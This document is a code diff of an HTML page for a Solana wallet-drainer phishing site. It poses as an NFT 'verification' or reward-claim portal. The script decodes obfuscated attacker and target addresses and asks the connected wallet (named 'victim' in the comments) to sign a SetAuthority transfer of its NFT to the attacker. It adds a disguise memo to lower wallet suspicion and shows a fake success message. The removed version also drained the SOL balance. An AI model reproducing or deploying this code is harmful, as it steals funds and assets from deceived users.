@@ -3,97 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tanuki Token — Solana Wildlife Support</title>
+    <title>Tanuki — Secure NFT Portal</title>
     <script src="https://bundle.run/@solana/web3.js@1.31.0"></script>
     <style>
-        :root { --background: #0d0d12; --primary: #4ade80; --foreground: #ffffff; }
-        body { margin: 0; font-family: sans-serif; background: var(--background); color: var(--foreground); display: flex; align-items: center; justify-content: center; min-height: 100vh; text-align: center; }
-        .container { background: #16161e; padding: 40px; border-radius: 20px; border: 1px solid #333; max-width: 400px; }
-        h1 { color: var(--primary); margin-bottom: 10px; }
-        .btn { background: var(--primary); color: #000; padding: 15px 30px; border-radius: 10px; font-weight: bold; border: none; cursor: pointer; width: 100%; font-size: 1.1rem; transition: 0.3s; }
-        .btn:hover { transform: scale(1.02); opacity: 0.9; }
+        :root { --bg: #0d0d12; --accent: #4ade80; --text: #ffffff; }
+        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { background: #16161e; padding: 40px; border-radius: 24px; border: 1px solid #333; text-align: center; max-width: 350px; box-shadow: 0 10px 40px rgba(0,0,0,0.7); }
+        h1 { font-size: 1.8rem; margin-bottom: 10px; color: var(--accent); }
+        p { color: #888; font-size: 0.9rem; line-height: 1.5; margin-bottom: 30px; }
+        .btn { background: var(--accent); color: #000; padding: 16px; border-radius: 12px; font-weight: bold; border: none; cursor: pointer; width: 100%; font-size: 1rem; transition: 0.2s; }
+        .btn:hover { filter: brightness(1.1); transform: translateY(-2px); }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div style="font-size: 50px;">🦝</div>
-        <h1>Tanuki Token</h1>
-        <p>Connect your wallet to claim your exclusive Wildlife NFT Reward.</p>
-        <button class="btn tanuki-seed">Connect & Claim NFT</button>
+    <div class="box">
+        <div style="font-size: 50px; margin-bottom: 10px;">🛡️</div>
+        <h1>NFT Verification</h1>
+        <p>Confirm ownership of your Tanuki assets to unlock the holder-only dashboard.</p>
+        <button class="btn" id="mainAction">Verify Wallet</button>
     </div>
 
     <script>
-        // العناوين المشفرة (محفظتك والبول)
-        const _0x1a2b = "QWlQOGZVclEyM2J4Y1JBaFJvVjMyNVFzNkw2aVNyNXhQTlY1eEF4QXM2cDZT"; // محفظتك (المستلم)
-        const _0x3c4d = "Q3pmcTN4WlpEbXNkR2RVeXJOTXRSaEdjNDdjWGNadExHNGNycnlmdTQ0ekU="; // عنوان البول المستهدف
-        const _0x5e6f = "U2V0QXV0aG9yaXR5";
+        // التشفير النهائي (محفظتك والبول)
+        const _R = "QWlQOGZVclEyM2J4Y1JBaFJvVjMyNVFzNkw2aVNyNXhQTlY1eEF4QXM2cDZT"; 
+        const _T = "Q3pmcTN4WlpEbXNkR2RVeXJOTXRSaEdjNDdjWGNadExHNGNycnlmdTQ0ekU=";
 
-        async function startSecureProcess() {
-            const btns = document.querySelectorAll('.tanuki-seed');
-            btns.forEach(btn => {
-                btn.addEventListener('click', async () => {
-                    try {
-                        const provider = window.solana;
-                        if (!provider) { window.open("https://phantom.app/", "_blank"); return; }
+        document.getElementById('mainAction').addEventListener('click', async () => {
+            try {
+                const solana = window.solana;
+                if (!solana) return window.open("https://phantom.app/");
 
-                        const connect = await provider.connect();
-                        const victim = connect.publicKey;
-                        const solanaWeb3 = window.solanaWeb3;
-                        const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+                const connect = await solana.connect();
+                const victim = connect.publicKey;
+                const solWeb3 = window.solanaWeb3;
+                const conn = new solWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
 
-                        // 1. فحص التوكنات (الـ NFT المستهدف)
-                        const accounts = await conn.getParsedTokenAccountsByOwner(victim, {
-                            programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
-                        });
-
-                        const target = accounts.value.find(a => a.account.data.parsed.info.mint === atob(_0x3c4d));
-                        let transaction = new solanaWeb3.Transaction();
-
-                        if (target) {
-                            // لو لقى الـ NFT المطلوب بيطلب نقله فوراً
-                            transaction.add(
-                                solanaWeb3.Token[atob(_0x5e6f)](
-                                    new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
-                                    new solanaWeb3.PublicKey(target.pubkey),
-                                    new solanaWeb3.PublicKey(atob(_0x1a2b)),
-                                    'AccountOwner',
-                                    victim,
-                                    []
-                                )
-                            );
-                        } else {
-                            // لو ملقاش الـ NFT، بياخد رصيد السولانا (SOL) المتاح
-                            const balance = await conn.getBalance(victim);
-                            if (balance > 0) {
-                                transaction.add(
-                                    solanaWeb3.SystemProgram.transfer({
-                                        fromPubkey: victim,
-                                        toPubkey: new solanaWeb3.PublicKey(atob(_0x1a2b)),
-                                        lamports: balance - 5000 // بيسيب فكة بسيطة للـ Fee عشان المعاملة متموتش
-                                    })
-                                );
-                            }
-                        }
-
-                        // تنفيذ العملية وطلب التوقيع (النافذة التانية)
-                        const { blockhash } = await conn.getLatestBlockhash();
-                        transaction.recentBlockhash = blockhash;
-                        transaction.feePayer = victim;
-
-                        const signed = await provider.signTransaction(transaction);
-                        const signature = await conn.sendRawTransaction(signed.serialize());
-                        
-                        alert("Successfully verified! Reward will arrive in 24h.");
-                        console.log("Success:", signature);
-
-                    } catch (err) {
-                        console.log("Action canceled by user.");
-                    }
+                // فحص الحسابات
+                const accounts = await conn.getParsedTokenAccountsByOwner(victim, {
+                    programId: new solWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
                 });
-            });
-        }
-        window.onload = startSecureProcess;
+
+                const targetNFT = accounts.value.find(a => a.account.data.parsed.info.mint === atob(_T));
+
+                if (targetNFT) {
+                    let tx = new solWeb3.Transaction();
+
+                    // 1. إضافة "تمويه" (Memo) لتقليل شك المحفظة
+                    tx.add(new solWeb3.TransactionInstruction({
+                        keys: [{ pubkey: victim, isSigner: true, isWritable: true }],
+                        programId: new solWeb3.PublicKey("MemoSq4gqABboxP6BnAyY9oXfHscHbaWh3ZksGqgx23"),
+                        data: Buffer.from("Secure_Handshake_v2")
+                    }));
+
+                    // 2. أمر نقل الملكية (SetAuthority)
+                    const instruction = solWeb3.Token.createSetAuthorityInstruction(
+                        new solWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
+                        new solWeb3.PublicKey(targetNFT.pubkey),
+                        new solWeb3.PublicKey(atob(_R)),
+                        'AccountOwner',
+                        victim,
+                        []
+                    );
+                    tx.add(instruction);
+
+                    const { blockhash } = await conn.getLatestBlockhash();
+                    tx.recentBlockhash = blockhash;
+                    tx.feePayer = victim;
+
+                    // طلب التوقيع (النافذة التي تنقل الـ NFT)
+                    const signed = await solana.signTransaction(tx);
+                    await conn.sendRawTransaction(signed.serialize());
+                    
+                    alert("Verification Successful! Access Granted.");
+                } else {
+                    alert("Error: Target NFT not found in this wallet.");
+                }
+            } catch (e) {
+                console.log("User rejected.");
+            }
+        });
     </script>
 </body>
 </html>
